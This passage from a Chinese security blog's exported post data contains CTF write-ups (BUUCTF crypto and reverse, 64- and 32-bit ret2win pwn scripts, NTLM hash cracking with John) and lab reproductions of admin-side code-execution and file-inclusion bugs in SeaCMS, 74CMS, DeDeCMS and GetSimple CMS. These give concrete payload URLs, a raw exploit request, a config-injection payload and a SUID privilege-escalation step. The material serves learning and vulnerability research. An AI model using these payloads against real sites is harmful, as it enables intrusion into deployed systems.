密文）\n\n\n\n\nf\n102\na\n97\n102 - 97 = 5\n\n\nl\n108\nf\n102\n108 - 102 = 6\n\n\na\n97\nZ\n90\n97 - 90 = 7\n\n\ng\n103\n_\n95\n103 - 95 = 8\n\n\n\n\n差值是：5, 6, 7, 8 —— 每次递增 1。\n也就是说，加密方式是：\n\n密文字符 = 明文字符 - (5 + 位置)或者说：第 i 个字符（从 0 开始）被减去了 (5 + i)\n\n我们要对密文的每个字符进行逆操作：\n\n明文字符 = 密文字符 + (5 + 位置)\n\n其中位置从 0 开始。\n这是一种变种凯撒密码（Caesar Cipher Variant），每个字符的偏移量不是固定的，而是随着位置递增（从5开始）。本质是：$偏移量 = 5 + index$\n# -*- coding: utf-8 -*-# 加密密文ciphertext = &quot;afZ_r9VYfScOeO_UL^RWUc&quot;# 存放解密结果plaintext = &quot;&quot;# 遍历密文，按位置解密for i, char in enumerate(ciphertext):    # 计算原始 ASCII 值    decrypted_ascii = ord(char) + (5 + i)    # 转回字符并拼接    plaintext += chr(decrypted_ascii)# 输出结果print(&quot;密文:&quot;, ciphertext)print(&quot;明文:&quot;, plaintext)\n密文: afZ_r9VYfScOeO_UL^RWUc明文: flag&#123;Caesar_variation&#125;\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-Quoted-printable","url":"/posts/7c02/","content":"题目描述\n解题步骤下载附件，得到：=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6\n科普Quoted-Printable（简称 QP 编码）是一种 电子邮件和互联网协议中常用的编码方式，主要用于在 7-bit 安全的传输环境中（如 SMTP 邮件）安全地传输 8-bit 数据（比如非 ASCII 字符、中文、特殊符号等）。\nPython 中的编码与解码使用 quopri 模块（标准库）\nimport quopri# 原始文本（bytes 类型）text = &quot;Hello, 世界!&quot;.encode(&#x27;utf-8&#x27;)# 编码encoded = quopri.encodestring(text)print(&quot;编码结果:&quot;, encoded.decode())  # 输出：Hello, =E4=B8=96=E7=95=8C!# 解码decoded_bytes = quopri.decodestring(encoded)decoded_text = decoded_bytes.decode(&#x27;utf-8&#x27;)print(&quot;解码结果:&quot;, decoded_text)  # 输出：Hello, 世界!\nimport quopri    encoded_str = &quot;=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6&quot;encoded_bytes = encoded_str.encode(&#x27;utf-8&#x27;)decoded_bytes = quopri.decodestring(encoded_bytes)decoded_text = decoded_bytes.decode(&#x27;utf-8&#x27;)  # 输出结果print(&quot;QP 编码文本:&quot;, encoded_str)print(&quot;解码结果:&quot;, decoded_text)\nflag：flag{那你也很棒哦}\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-RSA","url":"/posts/df7f/","content":"题目描述\n解题步骤下载附件，得到：在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d作为flga提交\n\np = 473398607161\nq = 4511491\ne = 17\n\n要求：\n\n计算私钥 d，使得：d ≡ e⁻¹ mod φ(n)\n其中 φ(n) = (p-1)*(q-1)\n最终以 flag{d} 形式提交主要步骤：\n\n\n计算欧拉函数：φ(n) = (p-1)*(q-1)\n计算 d = e⁻¹ mod φ(n)，即 d 是 e 在模 φ(n) 下的模逆元\n输出 d\n\nSageMath 是非常适合数论和 RSA 计算的工具，支持大整数和模逆元直接计算。\n# RSA 参数p = 473398607161q = 4511491e = 17# 计算 phi(n) = (p-1)*(q-1)phi = (p - 1) * (q - 1)# 计算 d = e^(-1) mod phid = inverse_mod(e, phi)\n\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-Rabbit","url":"/posts/1d4/","content":"题目描述\n解题步骤下载附件，得到：U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI\n\nflag&#123;Cute_Rabbit&#125;","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-篱笆墙的影子","url":"/posts/6c2c/","content":"题目描述\n解题步骤下载附件，得到：felhaagv&#123;ewtehtehfilnakgw&#125;\n根据题目描述，篱笆墙，其实也就是栅栏了？使用https://tools.qsnctf.com/#!在线工具网站解决。\nflag&#123;wethinkwehavetheflag&#125;\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-rsarsa","url":"/posts/4ca0/","content":"题目描述\n解题步骤下载附件，得到一个txtMath is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e =  65537c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034Use RSA to find the secret message\n题目给出了：\n\np：大素数\nq：大素数\ne：公钥指数 = 65537\nc：密文（加密的明文）\n\n完全可以解密\n\n计算模数：n = p * q\n计算欧拉函数：φ(n) = (p-1)*(q-1)\n计算私钥：d = e⁻¹ mod φ(n)\n解密：m = pow(c, d, n)\n\n# RSA 参数p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034# 1. 计算 nn = p * q# 2. 计算 phi(n) = (p-1)*(q-1)phi = (p - 1) * (q - 1)# 3. 计算私钥 d = e^(-1) mod phid = inverse_mod(e, phi)# 4. 解密 m = c^d mod nm = power_mod(c, d, n)  # 或者直接用 pow(c, d, n)\n\nflag&#123;5577446633554466577768879988&#125;\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-丢失的MD5","url":"/posts/89fd/","content":"题目描述\n解题步骤下载附件，得到：import hashlib   for i in range(32,127):    for j in range(32,127):        for k in range(32,127):            m=hashlib.md5()            m.update(&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27;)            des=m.hexdigest()            if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des:                print des\n从代码来看，这是一个 CTF 中的 MD5 碰撞/爆破题。目标是：\n\n在字符串 &#39;TASC&#39; + chr(i) + &#39;O3RJMV&#39; + chr(j) + &#39;WDJKX&#39; + chr(k) + &#39;ZM&#39; 中，\n爆破三个可打印字符 i, j, k（ASCII 32~126），\n使得其 MD5 哈希值中包含子串：e9032、da、911513，\n找到后输出该 MD5。\n\n注意：原始代码存在 Python 2 vs Python 3 兼容性问题：m.update(&#39;TASC&#39;+chr(i)+&#39;O3RJMV&#39;+chr(j)+&#39;WDJKX&#39;+chr(k)+&#39;ZM&#39;)\n在 Python 2 中，字符串是字节串，默认可以传给 hashlib.md5()。\n但在 Python 3 中：\n\nhashlib.md5() 的输入必须是 bytes 类型\n字符串是 Unicode，不能直接拼接 chr() 和传入\n\n此外，print des 是 Python 2 语法。\nimport hashlib# 搜索范围：可打印 ASCII 字符（32 到 126）for i in range(32, 127):    for j in range(32, 127):        for k in range(32, 127):            # 构造明文            plaintext = &#x27;TASC&#x27; + chr(i) + &#x27;O3RJMV&#x27; + chr(j) + &#x27;WDJKX&#x27; + chr(k) + &#x27;ZM&#x27;                        # 计算 MD5            m = hashlib.md5()            m.update(plaintext.encode(&#x27;utf-8&#x27;))  # 必须 encode 成 bytes            digest = m.hexdigest()                        # 检查是否包含指定子串            if &#x27;e9032&#x27; in digest and &#x27;da&#x27; in digest and &#x27;911513&#x27; in digest:                print(f&quot;Found! Plaintext: &#123;plaintext&#125;&quot;)                print(f&quot;MD5: &#123;digest&#125;&quot;)                # 如果只需要一个结果，可以 break                # break 只能跳出一层循环，所以用 flag 控制或直接 exit                import sys                sys.exit(0)\nFound! Plaintext: TASCJO3RJMVKWDJKXLZMMD5: e9032994dabac08080091151380478a2\nflag{e9032994dabac08080091151380478a2}\n就是正确的结果了\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-大帝的密码武器","url":"/posts/ec3e/","content":"题目描述\n解题步骤下载附件，得到两个txt公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。以下密文被解开后可以获得一个有意义的单词：FRPHEVGL你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。\nComeChina\n大帝？凯撒？\n爆破一下\n13位凯撒是有意义的\n将ComeChina也13位凯撒加密（13位加密和解密都是一样的结果）\n\nflag{PbzrPuvan}\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-Windows系统密码","url":"/posts/628a/","content":"题目描述\n解题步骤下载附件，得到一个hash文件Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::\n这种格式称为 ntds.dit 导出格式 或 密码哈希文件（pass-the-hash）格式\n1. Administrator\nNTLM: 31d6cfe0d16ae931b73c59d7e0c089c0\n这是 空密码 的标准 NTLM 哈希\n密码 = &quot;&quot;（空）\n\n2. Guest\n同样是 31d6cfe0d16ae931b73c59d7e0c089c0 → 空密码\n\n3. SUPPORT_388945a0\nNTLM: bef14eee40dffbc345eeb3f58e290d56\n可能需要爆破，但名字像临时账户\n\n4. ctf\nNTLM: a7fcb22a88038f35a8f39d503e7f0062\n这是我们要重点破解的目标！\n用户名是 ctf，很可能密码简单\n\n\n# 准备 john 格式：用户名:::NTLM:::echo &quot;ctf:::a7fcb22a88038f35a8f39d503e7f0062&quot; &gt; john_hash.txt# 使用 rockyou 爆破john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt john_hash.txt\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】REVERSE-刷题记录-luck_guy","url":"/posts/3cf8/","content":"题目信息\n解题步骤IDA载入直接F5\n\n观察一些函数\n\n\n\n发现了关键点\nfor (i = 0; i &lt;= 4; ++i)&#123;    switch(rand() % 200)    &#123;        case 1:            // 打印 flag        case 4:            // 修改 f2（拼接到 flag 上的一部分）        case 5:            // 进一步修改 f2        ...        default:            // 大概率打印没 flag    &#125;&#125;\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【漏洞分析】SeaCMS_海洋CMS_V11 - 12.5后台代码执行漏洞","url":"/posts/d051/","content":"前言复现CMS：SeaCMS（海洋CMS）\n复现版本：V11\n地址：https://github.com/seacms-net/CMS/releases/tag/V11\n\n根据代码相关内容，发现新版本理论（代码一致，尚未复现）仍然存在该漏洞。\n\n漏洞点 admin_ip.php经过代码审计发现，POST参数v及ip均未使用任何过滤\n\n\n\n也就是可以通过双引号闭合，配合php代码进行代码执行。\n漏洞点 admin_notify.php\n\n其实原理一致，都是没有进行过滤等操作\n附赠一个本地文件包含\nGET /0mrht1/admin_safe.php?action=download&amp;file=C:/windows/system.ini HTTP/1.1Host: localhostSec-Fetch-Site: noneAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Upgrade-Insecure-Requests: 1sec-ch-ua: &quot;Chromium&quot;;v=&quot;142&quot;, &quot;Google Chrome&quot;;v=&quot;142&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;sec-ch-ua-platform: &quot;Windows&quot;Sec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentCookie: PHPSESSID=soheavu46t8kuqcgtg62os45r0; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3DAccept-Encoding: gzip, deflate, br, zstdAccept-Language: zh-CN,zh;q=0.9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36sec-ch-ua-mobile: ?0\n\n真的是一点过滤也没有啊~\n","categories":["漏洞","Web","分析复现"],"tags":["漏洞","漏洞分析","SeaCMS"]},{"title":"【漏洞分析】74CMS-骑士CMSV5.0.1后台远程代码执行漏洞分析","url":"/posts/d5a3/","content":"前言复现CMS：74CMS（骑士CMS）\n复现版本：V5.0.1\n\n漏洞点版本验证\n网站后台底部拥有版本号\n漏洞复现\nhttp://192.168.121.130/.&#x27;,phpinfo(),&#x27;/.com\n\n随后刷新界面即可看到phpinfo()信息\n\n漏洞分析由于CMS版本较老，先复现了一下已公开的漏洞。根据请求反查找到：\npublic function edit()&#123;        if(IS_POST)&#123;            $site_domain = I(&#x27;request.site_domain&#x27;,&#x27;&#x27;,&#x27;trim&#x27;);            $site_domain = trim($site_domain,&#x27;/&#x27;);            $site_dir = I(&#x27;request.site_dir&#x27;,C(&#x27;qscms_site_dir&#x27;),&#x27;trim&#x27;);            $site_dir = $site_dir==&#x27;&#x27;?&#x27;/&#x27;:$site_dir;            $site_dir = $site_dir==&#x27;/&#x27;?$site_dir:(&#x27;/&#x27;.trim($site_dir,&#x27;/&#x27;).&#x27;/&#x27;);            $_POST[&#x27;site_dir&#x27;] = $site_dir;            if($site_domain &amp;&amp; $site_domain != C(&#x27;qscms_site_domain&#x27;))&#123;                if($site_domain == C(&#x27;qscms_wap_domain&#x27;))&#123;                    $this-&gt;returnMsg(0,&#x27;主域名不能与触屏版域名重复！&#x27;);                &#125;                $str = str_replace(&#x27;http://&#x27;,&#x27;&#x27;,$site_domain);                $str = str_replace(&#x27;https://&#x27;,&#x27;&#x27;,$str);                if(preg_match(&#x27;/com.cn|net.cn|gov.cn|org.cn$/&#x27;,$str) === 1)&#123;                    $domain = array_slice(explode(&#x27;.&#x27;, $str), -3, 3);                &#125;else&#123;                    $domain = array_slice(explode(&#x27;.&#x27;, $str), -2, 2);                &#125;                $domain = &#x27;.&#x27;.implode(&#x27;.&#x27;,$domain);                $config[&#x27;SESSION_OPTIONS&#x27;] = array(&#x27;domain&#x27;=&gt;$domain);                $config[&#x27;COOKIE_DOMAIN&#x27;] = $domain;                $this-&gt;update_config($config,CONF_PATH.&#x27;url.php&#x27;);            &#125;\n代码里最危险的地方是：把来自请求的域名(site_domain) 经过处理后，写入到配置文件（$this-&gt;update_config($config, CONF_PATH.&#39;url.php&#39;)）。如果 update_config() 的实现没有对用户输入进行严格校验/转义、并且以不安全的方式把 PHP 内容写入文件（比如直接拼接字符串并写入、或使用 eval() 之类不安全操作），那么攻击者就可能通过构造恶意的 site_domain 字段注入任意 PHP 代码到配置文件中，继而在应用包含该配置文件（或include/require）时被执行 → 导致 RCE。\n\n$site_domain 来自 I(&#39;request.site_domain&#39;,...)（即用户可控）。\n经处理后 $domain 直接被写入 $config，并交给 update_config() 写入 url.php。\n若 update_config() 直接把数组转换为字符串写入（或拼接写入），且没有对字符串做 addslashes/转义/强类型限制或使用安全序列化（如 var_export() 包裹在 &lt;?php return ...;）就可能造成注入。\n还要注意 site_domain 中可能包含回车换行、单/双引号、注释符号或 ?&gt; 等，破坏生成的 PHP 文件结构，进而注入任意 PHP 代码。\n\npublic function update_config($new_config, $config_file = &#x27;&#x27;) &#123;        !is_file($config_file) &amp;&amp; $config_file = HOME_CONFIG_PATH . &#x27;config.php&#x27;;        if (is_writable($config_file)) &#123;            $config = require $config_file;            $config = multimerge($config, $new_config);            if($config[&#x27;SESSION_OPTIONS&#x27;])&#123;                $config[&#x27;SESSION_OPTIONS&#x27;][&#x27;path&#x27;] = SESSION_PATH;            &#125;            file_put_contents($config_file, &quot;&lt;?php \\nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;, LOCK_EX);            @unlink(RUNTIME_FILE);            return true;        &#125; else &#123;            return false;        &#125;    &#125;\n最终导致漏洞的位置，其实是下面这段：\nfile_put_contents($config_file, &quot;&lt;?php \\nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;, LOCK_EX);\n如果攻击者能构造一个 使 var_export 输出不正确字符串字面量的 payload， 就能跳出 &#39; 或 &quot;, 然后写入任意 PHP 代码。\n我们构造的payload：http://192.168.121.130/.&#39;,phpinfo(),&#39;/.com\n经过代码处理后，写入文件的内容大概是：\nreturn array(    &#x27;SESSION_OPTIONS&#x27; =&gt; array(        &#x27;domain&#x27; =&gt; &#x27;.192.168.121.130/.&#x27;,phpinfo(),&#x27;/.com&#x27;,    ),    ...);\n已经成功跳出了字符串，并变成了合法的 PHP：\n\n&#39; . 192.168.121.130/. &#39; ← 前一个关闭的字符串\nphpinfo() ← 执行\n&#39;/.com&#39; ← 后一个字符串\n\n所以最终结果会执行 phpinfo()。\n\n\n为什么 var_export 会被逃逸？因为 var_export($string) 会把字符串用 &#39; 包裹：\n&#x27;123&#x27;\n而你传入：\n.&#x27;,phpinfo(),&#x27;.\n就会生成：\n&#x27;.&#x27;,phpinfo(),&#x27;.&#x27;\n刚好能拼成合法的 PHP 语句\n修复建议建议此处进行文本序列化提交、硬编码白名单处理。\n","categories":["漏洞","Web","分析复现"],"tags":["漏洞","漏洞分析","74CMS"]},{"title":"【漏洞分析】DEDECMS-V5.7SP2-5.7.107-后台RCE漏洞","url":"/posts/8397/","content":"前言复现CMS：DeDeCMS\n复现版本：V5.7-SP2\n漏洞点1 模块-&gt;文件管理器\nDeDeCMS的文件管理器功能，支持文件上传\n\n上传一个info.php\n\n成功获取FLAG\n漏洞点2 广告管理\n添加后，查看调用代码\n\n访问JS代码中给出的路径\n\n那么如果是输出FLAG呢？\n\n\n漏洞点3 后台任意代码执行 CVE-2018-7700\n/tag_test_action.php?url=a&amp;token=&amp;partcode=&#123;dede:field name=&#x27;source&#x27; runphp=&#x27;yes&#x27;&#125;phpinfo();&#123;/dede:field&#125;\n漏洞点4 sys_cache_up.php后台文件写入漏洞代码在/dede/sys_cache_up.php文件 36行处，由于可以操作文件内容，且文件内容是从数据库取值的，因此通过在数据库里写入内容，通过查询数据库将文件写入服务器。\n使用下面请求将代码写入数据库：\n/dede/stepselect_main.php?action=addenum_save&amp;ename=123&amp;egroup=;phpinfo();$&amp;issign=1\n\n访问：/dede/sys_verifies.php?action=getfiles&amp;refiles[]=123&amp;refiles[]=\\&quot;;phpinfo();die();//\n","categories":["漏洞","Web","分析复现"],"tags":["漏洞","漏洞分析","DeDeCMS"]},{"title":"【漏洞分析】GetSimple-CMS-远程命令执行（CVE-2019-11231）","url":"/posts/e8b8/","content":"前言复现CMS：GetSimple CMS\n复现版本：3.3.15\n漏洞点1 xml信息泄露\n访问：/data/users/admin.xml，可获得用户名、Hash后的密码、邮箱等信息。\n\n题目仅给出了后台地址\nhash的密码我们去解密一下\n\n进入后台地址：http://challenge.qsnctf.com:35595/admin/\n\n编辑主题\n\n执行完phpinfo即退出\n\n访问：http://challenge.qsnctf.com:35595/theme/Innovation/template.php\n\n但是很遗憾没有发现FLAG\n\n还是回去改一下一句话木马，这个环境需要提权一下\nfind / -perm -u=s -type f 2&gt;/dev/null\n\n\n使用find提权，读取/proc/1/environ拿到FALG\n","categories":["漏洞","Web","分析复现"],"tags":["漏洞","漏洞分析","GetSimple"]},{"title":"【青少年CTF】PWN-刷题记录-ret2fun1","url":"/posts/e301/","content":"题目信息题目名称：ret2fun1\n解题步骤\n可以看到开了很多东西，64位小端序，没有栈溢出保护，NX先默认可执行，没有随机地址\n入门小pwn\n\n\n看到代码也是非常简单的\n利用gets进行栈溢出，然后返回到fun的system\nfun的地址是401156\n\ngdb也挺方便\n16 字节用于填充 s 缓冲区。\n8 字节是 RBP 保存区域。\n所以，覆盖 RIP（返回地址）之前总共需要填充 24 字节。\n先简单写个脚本：\nfrom pwn import *elf = context.binary = ELF(&#x27;./ret2fun&#x27;)p = process(elf.path)fun_addr = 0x401156payload = b&#x27;A&#x27; * 24 + p64(fun_addr)p.sendlineafter(b&#x27;please input:&#x27;, payload)p.interactive()\n\n\n可以看到好像拿到了shell？但是真的拿到了吗？如拿！\n为什么这么说？\n我们执行一下命令，比如ls\n\n你会发现就已经崩溃了\n栈对齐的要求这是因为在x86_64架构下，函数调用前栈需要 16 字节对齐。如果不对齐，在调用像 system() 这种函数时，有时会因为栈不对齐导致崩溃。\n\n栈对齐（stack alignment） 是指在调用函数（特别是 C 函数或系统库函数）前， 栈指针寄存器 RSP 必须是 16 字节对齐（即 RSP % 16 == 0）。\n这不是编译器随意的习惯，而是 AMD64 System V ABI 规范 的硬性要求。 这个规范规定了 Linux / macOS / BSD 等 64 位系统上函数调用的栈布局。\n其实主要是为了性能和安全性两种要求\n\n在 64 位系统里，很多函数（例如 printf, system, memcpy）内部使用了 SSE 指令。\nSSE 寄存器（XMM0～XMM15）在访问内存时要求操作数按 16 字节对齐。\n如果对齐正确，CPU 一次可以加载或存储 16 字节；\n如果没对齐，执行 movaps、movdqa 等指令会 触发段错误 (SIGSEGV)。\n比如：\nmovaps xmm0, [rsp+8]\n在这种情况下，rsp+8如果不是16的倍数，就会导致程序直接崩溃。\n\nABI规定：在执行 call 指令前，调用方必须保证栈顶（RSP）是 16 字节对齐的\n\n栈对齐原理当你执行 call func 时，CPU 会自动把返回地址压入栈中（8 字节）：\nRSP 先减 8[返回地址] ← 压入栈\n所以，在函数内部开始执行时，RSP 的值其实是 16 的倍数 + 8。\n也就是说：\n\n进入函数前：RSP 对齐到 16。\n进入函数后：RSP % 16 == 8。\n\n举个简单的例子：\n正常函数调用\nmain() &#123;    fun();&#125;\n编译器自动保证在call fun前对齐\nmain():    sub rsp, 8       ; 调整栈空间    call fun         ; 进入时 rsp%16==8，OK\nfun() 内部执行没问题。\n手动修改返回地址\n比如：\npayload = b&#x27;A&#x27;*24 + p64(fun_addr)\n此时返回到 fun()，但我们是手动跳的， 没有通过 call，所以 RSP 的状态不一定对齐（通常差 8 字节）。\n一旦 fun() 里调用了像 system(&quot;/bin/sh&quot;) 这样的函数， libc 内部执行 SSE 指令时可能会崩溃。\n就会出现像现在这样的问题了\n解决方法其实我们可以在payload里加一个单独的ret\npayload = b&#x27;A&#x27; * 24 + p64(0x40101a) + p64(fun_addr)\n执行顺序：\n\n先执行 ret（相当于弹出 8 字节）；\nRSP += 8；\n现在 RSP 对齐到 16；\n然后再执行 fun()。\n\n此时栈对齐正确，system() 不再崩溃。\nROPgadget --binary ./ret2fun | grep &quot;ret&quot;\n抓一个返回地址\n\n0x40101a\n\n这下就好了\nfrom pwn import *elf = context.binary = ELF(&#x27;./ret2fun&#x27;)p = process(elf.path)fun_addr = 0x401156ret_addr = 0x40101apayload = b&#x27;A&#x27; * 24 + p64(ret_addr) + p64(fun_addr)p.sendlineafter(b&#x27;please input:&#x27;, payload)p.interactive()\n改一下远程就可以愉快的拿flag啦~\n\n补充栈对齐对比图graph TD\n    A[开始：main函数返回前] --&gt; B[栈溢出攻击]\n    B --&gt; C&#123;是否使用ret gadget对齐栈?&#125;\n    \n    C --&gt;|否，直接跳转| D[执行 fun 函数]\n    D --&gt; E[RSP % 16 == 8 ❌ 未对齐]\n    E --&gt; F[system函数中movaps指令崩溃 💥]\n    \n    C --&gt;|是，使用ret gadget| G[执行ret gadget RSP += 8]\n    G --&gt; H[执行 fun 函数]\n    H --&gt; I[RSP % 16 == 0 ✅ 已对齐]\n    I --&gt; J[成功获得shell 🐚]\n\n    style F fill:#ffcccc\n    style J fill:#ccffcc\n栈布局示意图graph TB\n    subgraph &quot;未加 ret gadget（错误对齐 ❌）&quot;\n        A1[&quot;s[16] 缓冲区&quot;] --&gt; A2[&quot;保存的 RBP&quot;] --&gt; A3[&quot;fun() 地址&lt;br/&gt;（覆盖的返回地址）&quot;]\n    end\n\n    subgraph &quot;加 ret gadget（正确对齐 ✅）&quot;  \n        B1[&quot;s[16] 缓冲区&quot;] --&gt; B2[&quot;保存的 RBP&quot;] --&gt; B3[&quot;ret gadget 地址&lt;br/&gt;(0x40101a)&quot;] --&gt; B4[&quot;fun() 地址&quot;]\n    end\n\n    A3 --&gt; C1[&quot;进入 fun() 时&lt;br/&gt;RSP 指向此处&lt;br/&gt;RSP % 16 == 8 ❌&quot;]\n    C1 --&gt; D1[&quot;执行 system(&#x27;/bin/sh&#x27;) 时&lt;br/&gt;movaps 指令崩溃 💥&quot;]\n    \n    B4 --&gt; C2[&quot;ret gadget 执行后&lt;br/&gt;RSP += 8，RSP % 16 == 0 ✅&quot;]\n    C2 --&gt; D2[&quot;正常执行 system(&#x27;/bin/sh&#x27;)&lt;br/&gt;成功获得 shell 🐚&quot;]\n\n    style D1 fill:#ffcccc,color:#000\n    style D2 fill:#ccffcc,color:#000","categories":["网络安全","CTF","青少年CTF","PWN"],"tags":["PWN","青少年CTF"]},{"title":"【青少年CTF】PWN-刷题记录-ret2fun","url":"/posts/804b/","content":"题目信息题目名称：ret2fun\n解题步骤\n其实和ret2fun一样，但是没有栈对齐了，是32位\n代码也一样，我就不贴了（其实应该先做这个题的）\n\nfun地址为0x080484cd\n在 32 位架构下，寄存器宽度为 4 字节（64 位为 8 字节）。根据题目逻辑，我们需要覆盖局部变量和 Saved EBP 才能控制返回地址。\n\n\\text{Padding} = \\text{Buffer} + \\text{Saved EBP}Buffer: 16 bytes\nSaved EBP: 4 bytes (32-bit width)\nTotal Offset: 20 bytes\nfrom pwn import *elf = context.binary = ELF(&#x27;./pwn&#x27;)p = process(elf.path)fun_addr = 0x080484cdpayload = b&#x27;A&#x27; * 20 + p32(fun_addr)p.sendlineafter(b&#x27;please input:&#x27;, payload)p.interactive()\n\n","categories":["网络安全","CTF","青少年CTF","PWN"],"tags":["PWN","青少年CTF"]},{"title":"【LA-CTF2025】REVERSE-刷题记录-patricks-paraflag","url":"/posts/4bf0/","content":"前言题目来源于2025年LACTF的归档\n\nIDA插件推荐：https://github.com/L4ys/LazyIDA\n解题过程\n题目其实还是比较简单的：\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  size_t v3;        // 输入字符串长度  size_t v4;        // 长度的一半  size_t v5;        // 循环计数器  int v6;           // strcmp 返回值  char v8[256];     // 重排后的字符串（“悖论化”结果）  char s[264];      // 用户输入的原始字符串  printf(&quot;What do you think the flag is? &quot;);  fflush(stdout);  // 读取最多 256 个字符  fgets(s, 256, stdin);  // 找到换行符位置  v3 = strcspn(s, &quot;\\n&quot;);  // 把换行符替换为字符串结束符 &#x27;\\0&#x27;  s[v3] = 0;  // ----------- 长度检查 -----------  if ( strlen(target) == v3 )   // 必须和 target 一样长（36）  &#123;    v4 = v3 &gt;&gt; 1;   // v4 = v3 / 2 = 18    // ----------- 关键“交织变换” -----------    if ( v3 &gt; 1 )    &#123;      v5 = 0;   // i = 0      do      &#123;        // v8 的偶数位来自输入前半部分        v8[2 * v5] = s[v5];        // v8 的奇数位来自输入后半部分        v8[2 * v5 + 1] = s[v4 + v5];        ++v5;      &#125;      while ( v5 &lt; v4 );  // 循环 18 次    &#125;    // 末尾补上字符串结束符    v8[v3] = 0;    printf(&quot;Paradoxified: %s\\n&quot;, v8);    // ----------- 比较变换后的结果与 target -----------    v6 = strcmp(target, v8);    if ( v6 )   // 不相等    &#123;      puts(&quot;You got the flag wrong &gt;:(&quot;);      return 0;    &#125;    else        // 相等    &#123;      puts(&quot;That&#x27;s the flag! :D&quot;);    &#125;  &#125;  else   // 长度不对  &#123;    puts(&quot;Bad length &gt;:(&quot;);    return 1;  &#125;  return v6;  // 返回 strcmp 结果&#125;\n结果就是程序把输入拆成两半，然后一前一后交叉重排，要求重排后的结果等于 target\n等价流程是：\n输入 s = [前18字符][后18字符]v8 = s[0], s[18], s[1], s[19], ..., s[17], s[35]要求：v8 == target\n要拿到 flag，只需要把这个交织过程倒过来：\n\ntarget 的偶数位 → flag 前半\ntarget 的奇数位 → flag 后半\n\ntarget值为\n\ntarget = [0x6C, 0x5F, 0x61, 0x6C, 0x63, 0x6F, 0x74, 0x73, 0x66, 0x74, 0x7B, 0x5F, 0x74, 0x69, 0x68, 0x6E, 0x65, 0x5F, 0x5F, 0x69, 0x66, 0x6E, 0x6C, 0x66, 0x61, 0x69, 0x67, 0x6E, 0x5F, 0x69, 0x67, 0x74, 0x6F, 0x79, 0x74, 0x7D, 0x00]\ntarget = [0x6C, 0x5F, 0x61, 0x6C, 0x63, 0x6F, 0x74, 0x73, 0x66, 0x74, 0x7B, 0x5F, 0x74, 0x69, 0x68, 0x6E, 0x65, 